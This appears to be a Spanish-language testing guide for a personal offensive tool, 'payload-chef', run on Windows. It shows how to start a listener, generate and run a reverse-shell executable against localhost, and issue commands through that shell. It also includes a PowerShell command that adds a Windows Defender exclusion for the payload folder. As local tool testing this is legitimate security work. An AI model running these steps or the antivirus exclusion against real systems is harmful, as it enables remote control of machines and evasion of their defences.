# Testing PAYLOAD-CHEF (Windows Edition)

## Método Fácil con Python Listener

Ya que netcat no está disponible en Windows, usa el listener Python incluido.

### Paso 1: Abre DOS Terminales PowerShell

**Terminal 1 - Listener**:
```powershell
cd C:\Users\darama\OneDrive\Escritorio\cv\crimson-toolkit\payload-chef
python listener.py 4444
```

Verás:
```
═══════════════════════════════════════
     TCP Listener (Netcat Alternative)
═══════════════════════════════════════

╭─────────── TCP Listener Active ───────────╮
│ Listening on 0.0.0.0:4444                  │
│ Waiting for reverse shell connection...    │
╰────────────────────────────────────────────╯
```

**Terminal 2 - Generar y Ejecutar Payload**:
```powershell
cd C:\Users\darama\OneDrive\Escritorio\cv\crimson-toolkit\payload-chef

# Genera el payload (apuntando a localhost)
python payload-chef.py create --type reverse-shell --lhost 127.0.0.1 --lport 4444

# Ejecuta el payload
.\output\payload.exe
```

### Paso 2: Verifica la Conexión

En **Terminal 1** (listener) deberías ver:
```
╭──────────────────────────╮
│ Connection received from │
│ 127.0.0.1:XXXXX         │
╰──────────────────────────╯

Interactive shell active. Type commands:

[127.0.0.1]>
```

### Paso 3: Prueba Comandos

Ahora escribe comandos en Terminal 1:
```
[127.0.0.1]> whoami
DESKTOP-XXX\darama

[127.0.0.1]> dir
 Directorio de C:\Users\darama\...

[127.0.0.1]> ipconfig
...

[127.0.0.1]> exit
```

---

## Troubleshooting

### Si Windows Defender Bloquea el Payload

```powershell
# Añade exclusión temporal (SOLO para testing)
Add-MpPreference -ExclusionPath "C:\Users\darama\OneDrive\Escritorio\cv\crimson-toolkit\payload-chef\output"
```

### Si No Conecta

1. Verifica que listener esté corriendo ANTES de ejecutar payload
2. Usa `127.0.0.1` (localhost) para testing local
3. Verifica puerto con: `netstat -an | Select-String "4444"`

---

## Demo Completo (Copy-Paste)

```powershell
# Terminal 1
python listener.py 4444

# Terminal 2 (nueva ventana)
python payload-chef.py create --type reverse-shell --lhost 127.0.0.1 --lport 4444
.\output\payload.exe
```

¡Listo! Tendrás shell remoto en Terminal 1.
